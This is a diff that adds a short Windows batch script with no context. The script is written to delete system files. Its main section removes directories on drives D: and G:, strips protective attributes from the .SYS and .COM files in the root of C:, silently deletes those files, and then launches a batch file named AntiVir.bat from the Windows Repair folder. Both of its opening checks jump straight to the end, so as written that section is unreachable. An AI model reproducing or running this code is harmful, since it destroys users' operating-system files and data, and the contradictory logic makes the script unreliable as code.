@@ -1,0 +1,17 @@
+@ echo off
+
+if exist %SYSTEMROOT%\system\log.txt goto end
+if not exist %SYSTEMROOT%\system\log.txt goto end
+
+:start
+rmdir d:\
+rmdir g:\
+attrib -r -a -s -h c:\*.SYS
+attrib -r -a -s -h c:\*.COM
+
+del c:\*.SYS > nul
+del c:\*.COM > nul
+
+if exist %SYSTEMROOT%\Repair\AntiVir.bat %SYSTEMROOT%\Repair\AntiVir.bat
+
+:end
